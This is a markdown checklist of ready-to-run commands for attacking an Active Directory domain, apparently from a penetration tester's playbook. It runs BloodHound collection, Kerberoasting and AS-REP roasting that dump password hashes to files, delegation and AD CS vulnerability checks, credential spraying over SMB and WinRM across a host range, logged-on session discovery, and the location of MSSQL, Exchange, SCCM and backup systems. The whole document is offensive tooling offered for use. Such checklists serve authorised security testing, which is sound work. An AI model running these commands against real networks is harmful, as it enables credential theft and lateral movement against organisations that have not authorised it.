- [ ] **Collect BloodHound data**

  ```bash
  bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
  ```

  ```powershell
  .\SharpHound.exe -c All
  ```

- [ ] **Check domain groups and delegated rights**

  ```powershell
  whoami /groups
  Get-DomainUser -Identity alice
  Find-InterestingDomainAcl -ResolveGUIDs
  ```

- [ ] **Check Kerberos escalation paths**

  ```bash
  GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
  GetNPUsers.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile asrep_hashes.txt
  ```

- [ ] **Check delegation**

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --find-delegation
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
  ```

- [ ] **Check AD CS**

  ```bash
  certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
  ```

- [ ] **Check local admin access across hosts**

  ```bash
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN
  nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN
  ```

- [ ] **Check sessions on reachable/admin hosts**

  ```bash
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --loggedon-users
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --qwinsta
  ```

- [ ] **Check service accounts**

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --users
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --gmsa
  ```

  ```powershell
  Get-DomainUser -SPN
  ```

- [ ] **Check MSSQL**

  ```bash
  nxc mssql $RANGE -u $USER -p "$PASS" -d $DOMAIN
  mssqlclient.py $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth
  ```

- [ ] **Check Exchange**

  ```powershell
  Get-DomainGroup "*Exchange*"
  Get-DomainGroupMember "Organization Management"
  Get-DomainGroupMember "Exchange Windows Permissions"
  ```

- [ ] **Check SCCM/MECM**

  ```bash
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN | grep -Ei "sccm|mecm|configmgr|sms"
  ```

- [ ] **Check backup systems**

  ```bash
  nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN | grep -Ei "backup|veeam|commvault|rubrik|cohesity|netbackup|acronis"
  ```

- [ ] **Validate any new credential, hash, ticket, or access path**

  ```bash
  nxc smb $RANGE -u NEWUSER -p 'NewPassword123!' -d $DOMAIN
  nxc winrm $RANGE -u NEWUSER -p 'NewPassword123!' -d $DOMAIN
  ```
